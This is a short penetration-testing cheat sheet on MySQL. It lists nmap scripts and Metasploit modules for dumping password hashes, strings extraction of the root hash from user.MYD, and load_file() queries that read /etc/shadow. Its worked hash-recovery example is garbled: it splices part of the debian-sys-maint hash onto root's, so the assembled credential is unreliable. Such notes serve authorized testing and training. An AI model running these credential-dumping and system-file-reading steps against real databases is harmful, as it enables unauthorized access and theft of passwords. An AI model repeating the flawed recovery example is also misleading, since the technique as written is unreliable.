# MySQL

## Audit MySQL DBMS
with nmap
```bash
--script=mysql-audit
--script-args="mysql-audit.username='[root]',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
```

## Writable directories
It allows to create files in diferents directories and identify privileges on the root file system
```bash
scanner/mysql/mysql_writable_dirs
```

## Hashes
#### msfconsole
```bash
scanner/mysql/mysql_hashdump
```

#### nmap
```bash
--script=mysql-dump-hashes
--script-args="username='root', password=''"
```

## Queries with nmap
#### nmap
```bash
--script=mysql-query
--script-args="query='select count(*) from books.authors;',username='root', password=''"
```



## List databases and tables
```mysql
show databases;
use <DATABASE>;
show tables;
select * from <TABLE>;
```

## Recovery user pass
Once you're logged in, you can get access to the Mysql **root** password by running `strings` on the following file: `/var/lib/mysql/mysql/user.MYD`.

You should get 2 passwords:
- debian-sys-maint
- root

The `root` password is likely split into two parts:
```
    localhost
root*8246FACFAA5BB9CFDCDEAEDA
6c732c6044b7
root
    127.0.0.1
root
root
    localhost
debian-sys-maint*7B6D59ECDB7B791CF100CA46D0AD911082112351
15DA4067EAA55FBC
```
The first part is `*8246FACFAA5BB9CFDCDEAEDA` and the second part is `15DA4067EAA55FBC`.

Once you put them together, you should get a file containing:
```
root:*8246FACFAA5BB9CFDCDEAEDA15DA4067EAA55FBC
```

### Load protected files
```
select load_file('/var/lib/mysql-files/<File>');
select load_file('/etc/shadow');
```

